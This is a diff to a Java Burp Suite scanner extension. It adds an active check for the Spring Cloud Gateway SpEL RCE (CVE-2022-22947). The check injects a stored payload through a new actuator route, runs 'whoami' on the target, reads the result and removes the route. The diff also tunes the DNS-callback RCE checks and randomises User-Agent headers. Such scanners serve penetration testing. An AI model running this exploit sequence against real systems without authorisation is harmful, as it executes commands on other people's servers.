@@ -24,44 +24,6 @@ public class Scanner implements IScannerCheck {
     public BurpExtender burpExtender;
     private IExtensionHelpers helpers;
 
-    // 静态文件后缀
-    private final String[] STATIC_FILE_EXT = new String[]{
-            "png",
-            "jpg",
-            "jpeg",
-            "gif",
-            "pdf",
-            "bmp",
-            "js",
-            "css",
-            "ico",
-            "woff",
-            "woff2",
-            "ttf",
-            "otf",
-            "ttc",
-            "svg",
-            "psd",
-            "exe",
-            "zip",
-            "rar",
-            "7z",
-            "msi",
-            "tar",
-            "gz",
-            "mp3",
-            "mp4",
-            "mkv",
-            "swf",
-            "xls",
-            "xlsx",
-            "doc",
-            "docx",
-            "ppt",
-            "pptx",
-            "iso"
-    };
-
     // 存放每次同类uri的md5, 防止重复扫描
     private final Set<String> allScan = new HashSet<String>();
 
@@ -80,7 +42,7 @@ public class Scanner implements IScannerCheck {
         this.helpers = this.burpExtender.helpers;
         this.timer = new Timer();
         // 初始化pocs
-        this.pocs = Utils.getPocs(new Integer[]{1, 2, 3, 4, 5});
+        this.pocs = Utils.getPocs(new Integer[]{1, 2, 3, 4, 5, 6});
     }
 
     /**
@@ -100,7 +62,7 @@ public class Scanner implements IScannerCheck {
         IResponseInfo responseInfo = this.helpers.analyzeResponse(iHttpRequestResponse.getResponse());
         String url = String.valueOf(requestInfo.getUrl());
         String url_md5 = normalized(requestInfo);
-        if (!this.isStaticFile(url) && !this.isChecked(url_md5)) {  // 跳过静态文件和同类uri
+        if (!Utils.isStaticFile(url) && !this.isChecked(url_md5)) {  // 跳过静态文件和同类uri
             this.burpExtender.stdout.println(String.format("[*] Scanning %s", url));
             // 扫描任务状态添加到UI
             int id = this.burpExtender.tags.getScannerUi().add(
@@ -182,6 +144,24 @@ public class Scanner implements IScannerCheck {
                     );
                 }
                 this.allScan.add(url_md5);
+                // Spring Cloud GateWay SPEL RCE (CVE-2022-22947)
+                IScanIssue gatewayIssue = this.CloudGatewayScan(iHttpRequestResponse);
+                if (gatewayIssue != null) {
+                    isVul = true;
+                    this.burpExtender.stdout.println(String.format("[+] RCEChecker found %s Vul!", url));
+                    issues.add(gatewayIssue);
+                    // 扫描结果输出到UI
+                    this.burpExtender.tags.getScannerUi().save(
+                            id,
+                            "RCECheck",
+                            this.burpExtender.helpers.analyzeRequest(gatewayIssue.getHttpMessages()[0]).getMethod(),
+                            String.valueOf(this.burpExtender.helpers.analyzeRequest(gatewayIssue.getHttpMessages()[0]).getUrl()),
+                            String.valueOf(this.helpers.analyzeResponse(gatewayIssue.getHttpMessages()[0].getResponse()).getStatusCode()),
+                            "[+] Spring Cloud GateWay SpEL RCE",
+                            gatewayIssue.getHttpMessages()[0]
+                    );
+                }
+                this.allScan.add(url_md5);
             }
             // 不存在漏洞, 更新UI
             if (!isVul) {
@@ -257,14 +237,14 @@ public class Scanner implements IScannerCheck {
         IHttpRequestResponse requestResponse1 = this.burpExtender.callbacks.makeHttpRequest(httpRequestResponse.getHttpService(), newParamReq);
         IResponseInfo response1 = this.helpers.analyzeResponse(requestResponse1.getResponse());
         // 第一次请求为报错状态码,
-        if (this.isErrorStatusCode(response1.getStatusCode())) {
+        if (Utils.isErrorStatusCode(response1.getStatusCode())) {
             newParam = this.helpers.buildParameter(key, value2, ("GET".equalsIgnoreCase(method)) ? IParameter.PARAM_URL : IParameter.PARAM_BODY);
             newParamReq = this.helpers.addParameter(newHeaderRequest, newParam);
             if (reverseMethod) newParamReq = this.helpers.toggleRequestMethod(newParamReq);
             IHttpRequestResponse requestResponse2 = this.burpExtender.callbacks.makeHttpRequest(httpRequestResponse.getHttpService(), newParamReq);
             IResponseInfo response2 = this.helpers.analyzeResponse(requestResponse2.getResponse());
             // 第二次正常请求，防止扫到原本就报错的站
-            if (!this.isErrorStatusCode(response2.getStatusCode())) {
+            if (!Utils.isErrorStatusCode(response2.getStatusCode())) {
                 return new SpringIssue(
                         requestInfo.getUrl(),
                         "Spring Core RCE",
@@ -294,9 +274,9 @@ public class Scanner implements IScannerCheck {
         requestResponse1 = this.burpExtender.callbacks.makeHttpRequest(httpRequestResponse.getHttpService(), newParamReq);
         response1 = this.helpers.analyzeResponse(requestResponse1.getResponse());
         // 第一次请求为报错状态码
-        if (this.isErrorStatusCode(response1.getStatusCode())) {
+        if (Utils.isErrorStatusCode(response1.getStatusCode())) {
             // 与正常请求比较，防止扫到原本就报错的站
-            if (!this.isErrorStatusCode(this.burpExtender.helpers.analyzeResponse(httpRequestResponse.getResponse()).getStatusCode())) {
+            if (!Utils.isErrorStatusCode(this.burpExtender.helpers.analyzeResponse(httpRequestResponse.getResponse()).getStatusCode())) {
                 return new SpringIssue(
                         requestInfo.getUrl(),
                         "Spring Core RCE",
@@ -343,8 +323,8 @@ public class Scanner implements IScannerCheck {
         // 请求是否被ban
         if (requestResponse.getResponse() != null) {
             this.burpExtender.stdout.println("[*] Reverse Checking Spring Core RCE for: " + requestInfo.getUrl().toString() + " ...");
-            // 5min内查看是否回连
-            for (int i = 0; i < 10; i++) {
+            // 30s内查看是否回连
+            for (int i = 0; i < 3; i++) {
 //                this.burpExtender.stdout.println("[-] No." + i + " Checking " + requestInfo.getUrl().toString());
                 if (this.backend.checkResult(payload)) {
                     return new SpringIssue(
@@ -362,7 +342,7 @@ public class Scanner implements IScannerCheck {
                     );
                 }
                 try {
-                    Thread.sleep(30 * 1000);  // sleep 30s
+                    Thread.sleep(10 * 1000);  // sleep 10s
                 } catch (InterruptedException e) {
                     this.burpExtender.stderr.println(e.getMessage());
                 }
@@ -377,6 +357,8 @@ public class Scanner implements IScannerCheck {
      * @return IScanIssue
      */
     private IScanIssue CloudFunctionSpelRCE(IHttpRequestResponse httpRequestResponse) {
+        // 加入是否是spring指纹的判断
+        if (!this.isSpringFinger(httpRequestResponse)) return null;
         boolean is500 = false;  // 是否打到500响应
         byte[] newHeaderRequest = this.randomHeader(httpRequestResponse);  // 随机Agent-User头
         IHttpService httpService = httpRequestResponse.getHttpService();
@@ -403,8 +385,8 @@ public class Scanner implements IScannerCheck {
             is500 = this.helpers.analyzeResponse(httpRequestResponse1.getResponse()).getStatusCode() == 500 || this.helpers.analyzeResponse(httpRequestResponse2.getResponse()).getStatusCode() == 500;
             requestInfo = this.helpers.analyzeRequest(httpRequestResponse2);  // record 数据包
 
-            // 打默认路由/functionRouter
-            byte[] frRequest = this.helpers.buildHttpRequest(new URL(httpService.getProtocol(), httpService.getHost(), httpService.getPort(), "/functionRouter"));
+            // 打当前uri+/functionRouter
+            byte[] frRequest = this.helpers.buildHttpRequest(new URL(httpService.getProtocol(), httpService.getHost(), httpService.getPort(), Utils.getUri(requestInfo.getUrl().toString()) + "functionRouter"));
             IHttpRequestResponse frRequestResponse = this.burpExtender.callbacks.makeHttpRequest(httpService, frRequest);
             // 是否存在默认路由
             if (this.helpers.analyzeResponse(frRequestResponse.getResponse()).getStatusCode() != 404) {
@@ -419,8 +401,8 @@ public class Scanner implements IScannerCheck {
             // 打完check poc再检测是否回连
             if (is500) {
                 this.burpExtender.stdout.println("[*] Reverse Checking Spring Cloud Function SpEL RCE for: " + requestInfo.getUrl().toString() + " ...");
-                // 5min内查看是否回连
-                for (int i = 0; i < 10; i++) {
+                // 30s内查看是否回连
+                for (int i = 0; i < 3; i++) {
 //                    this.burpExtender.stdout.println("[-] No." + i + " Checking Spring Cloud Function SpEL RCE for: " + requestInfo.getUrl().toString());
                     if (this.backend.checkResult(payload)) {
                         return new SpringIssue(
@@ -438,7 +420,7 @@ public class Scanner implements IScannerCheck {
                         );
                     }
                     try {
-                        Thread.sleep(30 * 1000);  // sleep 30s
+                        Thread.sleep(10 * 1000);  // sleep 10s
                     } catch (InterruptedException e) {
                         this.burpExtender.stderr.println(e.getMessage());
                     }
@@ -484,23 +466,198 @@ public class Scanner implements IScannerCheck {
      * Spring Cloud GateWay SPEL RCE (CVE-2022-22947)
      * 一共发五个请求：
      * 包含恶意SpEL表达式的路由 -> 刷新路由 -> 访问添加的路由查看结果 -> 删除路由 -> 刷新路由
+     * TODO: 循环解析URI 判断每一层目录是否具有Spring指纹
      * @param httpRequestResponse
      * @return IScanIssue
      */
     private IScanIssue CloudGatewayScan(IHttpRequestResponse httpRequestResponse) {
+        // 这里判断是否有spring 404的特征: Whitelabel Error Page
+        if (!this.isSpringFinger(httpRequestResponse)) return null;
+        URL url = this.helpers.analyzeRequest(httpRequestResponse).getUrl();
+        String uri = Utils.getUri(url.toString());
+        String random_uri = Utils.randomStr(5);
+        if (this.CloudGatewayRegisterRoute(httpRequestResponse, uri, random_uri, "whoami")) {
+            if (this.CloudGatewayRefresh(httpRequestResponse, uri)) {
+                IHttpRequestResponse requestResponse = this.CloudGatewayRoute(httpRequestResponse, uri, random_uri, false);
+                if (requestResponse != null) {
+                    // 删除路由
+                    this.CloudGatewayRoute(httpRequestResponse, uri, random_uri, true);
+                    this.CloudGatewayRefresh(httpRequestResponse, uri);
+                }
+                return new SpringIssue(
+                        url,
+                        "Spring Cloud GateWay SPEL RCE",
+                        0,
+                        "High",
+                        "Certain",
+                        null,
+                        null,
+                        "",
+                        null,
+                        new IHttpRequestResponse[]{requestResponse},
+                        requestResponse.getHttpService()
+                );
+            }
+        }
         return null;
     }
 
+    /**
+     * 注册随机路由并打入POC6
+     * @param httpRequestResponse
+     * @param uri
+     * @return true/false
+     */
+    private boolean CloudGatewayRegisterRoute(IHttpRequestResponse httpRequestResponse, String uri, String random_uri, String cmd) {
+        try {
+            IHttpService service = httpRequestResponse.getHttpService();
+            // poc
+            IPoc poc6 = this.pocs[5];
+            String poc66 = this.helpers.bytesToString(this.helpers.base64Decode(poc6.genPoc()));
+            poc66 = String.format(poc66, random_uri, cmd);
+            byte[] refreshRequest = this.helpers.buildHttpRequest(new URL(service.getProtocol(), service.getHost(), service.getPort(), uri +"actuator/gateway/routes/" + random_uri));
+            // headers
+            List<String> headers = new ArrayList<String>();
+            headers.add("POST " + uri + "actuator/gateway/routes/" + random_uri + " HTTP/1.1");
+            headers.add("Host: " + service.getHost() + ":" + service.getPort());
+            headers.add("User-Agent: " + RandomHeaders.randomHeader());
+            headers.add("Accept-Encoding: gzip, deflate");
+            headers.add("Accept-Language: en");
+            headers.add("Accept: */*");
+            headers.add("Content-Type: application/json");
+            headers.add("Connection: close");
+            // 加入POST的POC
+            IParameter param = this.helpers.buildParameter(poc66 + ",{\"", "\"}", IParameter.PARAM_BODY);
+            refreshRequest = this.helpers.addParameter(refreshRequest, param);
+            // 截取新请求, buildHttpRequest()之后会包含原本的GET请求内容和自定义构造的headers+POST内容, 所以要截取
+            IRequestInfo requestInfo = this.helpers.analyzeRequest(service, refreshRequest);
+            refreshRequest = new String(refreshRequest).substring(requestInfo.getBodyOffset()).getBytes();
+            // 组装请求
+            byte[] newRequest = this.helpers.buildHttpMessage(headers, refreshRequest);
+            IHttpRequestResponse requestResponse = this.burpExtender.callbacks.makeHttpRequest(service, newRequest);
+            IResponseInfo responseInfo1 = this.helpers.analyzeResponse(requestResponse.getResponse());
+            IRequestInfo requestInfo1 = this.helpers.analyzeRequest(requestResponse.getRequest());
+            if (responseInfo1.getStatusCode() == 201) return true;
+        } catch (MalformedURLException e) {
+            e.printStackTrace();
+            this.burpExtender.stderr.println(e.getMessage());
+        }
+        return false;
+    }
 
     /**
      * 刷新路由
      * /actuator/gateway/refresh
      * @return
      */
-    private byte[] CloudGatewayRefresh(IHttpRequestResponse httpRequestResponse) {
-        byte[] newHeader = this.randomHeader(httpRequestResponse);
-        this.helpers.analyzeRequest(newHeader);
+    private boolean CloudGatewayRefresh(IHttpRequestResponse httpRequestResponse, String uri) {
+        try {
+            IHttpService service = httpRequestResponse.getHttpService();
+            // uri
+            byte[] refreshRequest = this.helpers.buildHttpRequest(new URL(service.getProtocol(), service.getHost(), service.getPort(), uri + "actuator/gateway/refresh"));
+            // headers
+            List<String> headers = new ArrayList<String>();
+            headers.add("POST " + uri + "actuator/gateway/refresh HTTP/1.1");
+            headers.add("Host: " + service.getHost() + ":" + service.getPort());
+            headers.add("User-Agent: " + RandomHeaders.randomHeader());
+            headers.add("Accept-Encoding: gzip, deflate");
+            headers.add("Accept: */*");
+            headers.add("Content-Type: application/x-www-form-urlencoded");
+            headers.add("Connection: close");
+            // 截取新请求, buildHttpRequest()之后会包含原本的GET请求内容和自定义构造的headers内容, 所以要截取
+            IRequestInfo requestInfo = this.helpers.analyzeRequest(service, refreshRequest);
+            refreshRequest = new String(refreshRequest).substring(requestInfo.getBodyOffset()).getBytes();
+            // 组装请求
+            byte[] newRequest = this.helpers.buildHttpMessage(headers, refreshRequest);
+            IHttpRequestResponse requestResponse = this.burpExtender.callbacks.makeHttpRequest(service, newRequest);
+            IResponseInfo responseInfo1 = this.helpers.analyzeResponse(requestResponse.getResponse());
+            if (responseInfo1.getStatusCode() == 200) return true;
+        } catch (MalformedURLException e) {
+            e.printStackTrace();
+            this.burpExtender.stderr.println(e.getMessage());
+        }
+        return false;
+    }
+
+    /**
+     * 访问注册的路由获取RCE结果
+     * 返回结果响应输出到UI
+     * @param httpRequestResponse
+     * @param uri
+     * @param random_uri
+     * @param deleteRoute 是否删除路由
+     * @return
+     */
+    private IHttpRequestResponse CloudGatewayRoute(IHttpRequestResponse httpRequestResponse, String uri, String random_uri, boolean deleteRoute) {
+        try {
+            IHttpService service = httpRequestResponse.getHttpService();
+            // uri
+            byte[] refreshRequest = this.helpers.buildHttpRequest(new URL(service.getProtocol(), service.getHost(), service.getPort(), uri + "actuator/gateway/routes/" + random_uri));
+            // headers
+            List<String> headers = new ArrayList<String>();
+            headers.add(((deleteRoute) ? "DELETE " : "GET ") + uri + "actuator/gateway/routes/" + random_uri + " HTTP/1.1");
+            headers.add("Host: " + service.getHost() + ":" + service.getPort());
+            headers.add("User-Agent: " + RandomHeaders.randomHeader());
+            headers.add("Accept-Encoding: gzip, deflate");
+            headers.add("Accept: */*");
+            headers.add("Content-Type: application/x-www-form-urlencoded");
+            headers.add("Connection: close");
+            // 截取新请求, buildHttpRequest()之后会包含原本的GET请求内容和自定义构造的headers内容, 所以要截取
+            IRequestInfo requestInfo = this.helpers.analyzeRequest(service, refreshRequest);
+            refreshRequest = new String(refreshRequest).substring(requestInfo.getBodyOffset()).getBytes();
+            // 组装请求
+            byte[] newRequest = this.helpers.buildHttpMessage(headers, refreshRequest);
+            IHttpRequestResponse requestResponse = this.burpExtender.callbacks.makeHttpRequest(service, newRequest);
+            byte[] rawResponse = requestResponse.getResponse();
+            IResponseInfo responseInfo1 = this.helpers.analyzeResponse(rawResponse);
+            String strResponse = this.helpers.bytesToString(rawResponse);
+            if (responseInfo1.getStatusCode() == 200 && strResponse.contains(random_uri) && strResponse.contains("Result")) {
+                return requestResponse;
+            };
+        } catch (MalformedURLException e) {
+            e.printStackTrace();
+            this.burpExtender.stderr.println(e.getMessage());
+        }
         return null;
+    }
+
+    /**
+     * 随机访问一个uri路径, 判断响应内容是否有spring特征 (Whitelabel Error Page)
+     * @param httpRequestResponse
+     * @return
+     */
+    private boolean isSpringFinger(IHttpRequestResponse httpRequestResponse) {
+        try {
+            IRequestInfo requestInfo = this.helpers.analyzeRequest(httpRequestResponse);
+            IHttpService service = httpRequestResponse.getHttpService();
+            String url = requestInfo.getUrl().toString();
+            byte[] newRequest = this.helpers.buildHttpRequest(new URL(service.getProtocol(), service.getHost(), service.getPort(), Utils.getUri(url) + Utils.randomStr(5)));
+            requestInfo = this.helpers.analyzeRequest(service, newRequest);  // 重新打包好新的uri请求
+            // header中Accpet: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+            List<String> headers = requestInfo.getHeaders();
+            for (String header: headers) {
+                if (header.startsWith("Accept")) {  // 坑点: 带冒号匹配会报错
+                    headers.remove(header);
+                    headers.add("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
+                    break;
+                }
+            }
+            // 截取新请求, buildHttpRequest()之后会包含原本的GET请求内容和自定义构造的headers内容, 所以要截取
+            IRequestInfo requestInfo1 = this.helpers.analyzeRequest(service, newRequest);
+            newRequest = new String(newRequest).substring(requestInfo1.getBodyOffset()).getBytes();
+            // 组装请求
+            newRequest = this.helpers.buildHttpMessage(headers, newRequest);
+            IHttpRequestResponse requestResponse = this.burpExtender.callbacks.makeHttpRequest(httpRequestResponse.getHttpService(), newRequest);
+            String body = new String(requestResponse.getResponse()).substring(this.helpers.analyzeResponse(requestResponse.getResponse()).getBodyOffset()).toLowerCase();
+            if (body.contains("whitelabel error page")) {
+                this.burpExtender.stdout.println("[*] Detect Spring Finger: " + url);
+                return true;
+            }
+        } catch (MalformedURLException e) {
+            e.printStackTrace();
+            this.burpExtender.stderr.println(e.getMessage());
+        }
+        return false;
     }
 
     /**
@@ -529,19 +686,6 @@ public class Scanner implements IScannerCheck {
     }
 
     /**
-     * 判断uri是否静态文件,
-     * 使用传统的循环判断，时间复杂度为O(1)
-     * @param url
-     * @return true/false
-     */
-    private boolean isStaticFile(String url) {
-        for (String ext : this.STATIC_FILE_EXT) {
-            if (ext.equalsIgnoreCase(Utils.getUriExt(url))) return true;
-        }
-        return false;
-    }
-
-    /**
      * 归一化请求包
      * 格式: ${url} + GET/POST
      * @param requestInfo
@@ -563,18 +707,11 @@ public class Scanner implements IScannerCheck {
     }
 
     /**
-     * 判断状态码是否是异常
-     * 排除正常响应码: 200, 404，302
-     * @param status_code
-     * @return
+     * 关闭持续监听的Dnslog
      */
-    private boolean isErrorStatusCode(int status_code) {
-        return Arrays.stream(new Integer[]{200, 404, 302}).noneMatch(e -> e == status_code);
+    public void close() {
+        if (this.backend != null) {
+            this.backend.close();
+        }
     }
-
-    private IHttpRequestResponse requestWithHeaders() {
-
-        return null;
-    }
-
 }
